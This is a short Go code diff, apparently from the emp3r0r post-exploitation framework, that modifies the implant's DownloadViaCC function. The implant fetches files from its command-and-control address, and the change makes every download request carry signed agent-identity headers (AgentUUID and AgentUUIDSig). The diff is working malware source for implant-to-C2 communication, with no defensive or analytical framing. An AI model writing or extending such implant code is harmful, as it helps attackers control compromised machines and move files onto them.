@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net/http"
 	"net/url"
 	"os"
 	"time"
@@ -69,7 +70,14 @@ func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
 	// use EmpHTTPClient if no path specified
 	if retData {
 		client := tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
-		resp, err := client.Get(url)
+		req, err := http.NewRequest("GET", url, nil)
+		if err != nil {
+			err = fmt.Errorf("DownloadViaCC HTTP GET failed to create request: %v", err)
+			return nil, err
+		}
+		req.Header.Set("AgentUUID", RuntimeConfig.AgentUUID)
+		req.Header.Set("AgentUUIDSig", RuntimeConfig.AgentUUIDSig)
+		resp, err := client.Do(req)
 		if err != nil {
 			err = fmt.Errorf("DownloadViaCC HTTP GET: %v", err)
 			return nil, err
@@ -95,6 +103,8 @@ func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
 		err = fmt.Errorf("Create grab request: %v", err)
 		return
 	}
+	req.HTTPRequest.Header.Set("AgentUUID", RuntimeConfig.AgentUUID)
+	req.HTTPRequest.Header.Set("AgentUUIDSig", RuntimeConfig.AgentUUIDSig)
 	resp := client.Do(req)
 
 	// progress
